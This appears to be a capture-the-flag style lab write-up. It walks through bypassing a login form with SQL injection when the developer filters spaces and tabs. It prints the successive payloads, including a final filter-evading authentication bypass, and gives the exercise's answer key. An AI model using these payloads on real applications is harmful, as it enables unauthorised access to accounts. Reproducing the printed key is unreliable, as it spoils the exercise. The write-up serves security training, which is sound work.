In this example, the developer blocks spaces and tabulations. There is a way to bypass this filter. You can:

   * you don't need spaces between the keywords in your injection.
   * you can use # instead of -- (if necessary).

By applying these tricks, you should be able to exploit this vulnerability.

 You can access this exercise using the following URL: http://ptc-48c8fefb-edb453b8.libcurl.so/. 
 You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-48c8fefb-edb453b8.libcurl.so/.

    Steps:
        1) Visit the given URL: http://ptc-48c8fefb-edb453b8.libcurl.so/. And we'll get login page.
        2) Try to inject with single quote (') in username admin as before and we'll get syntax error.
        3) Let's try to inject with the payload: admin' or 1=1 --'
            Username: admin' or 1=1 --'
            Password: admin
        4) Intercept the process while login the page. And send to the repeater. We'll can see :
             username=admin%27+or+1%3D1+--%27&password=admin
             Let's replace '+' with '%09'. It looks as:
            username=admin%27%09or%091%3D1%09--%27&password=admin
        5) We know that  the developer blocks spaces and tabulations. There is a way to bypass this filter. We can:
            a) We don't need spaces between the keywords in our injection.
            b) We can use # instead of -- (if necessary).
            Now we can make some changes:
            let's replace '--' with '#'
            username=admin%27%09or%091%3D1%09#%27&password=admin
            Again,replace 'or' with '||" and use encoded '#' as %23. Also replace %09.Then remove after # i.e. %27.
                         username=admin%27||1%3D1%23%&password=admin
        6) We can get 302 in response. Simply we can use "show response in browser' or 'follow redirection' to get the response.
        7) Bravo!! We are currently logged in! The key for this exercise is 8dbd3ff8-9aee-4a63-83d9-d5a2fd7a5696.

        Happy Hacking!! :)
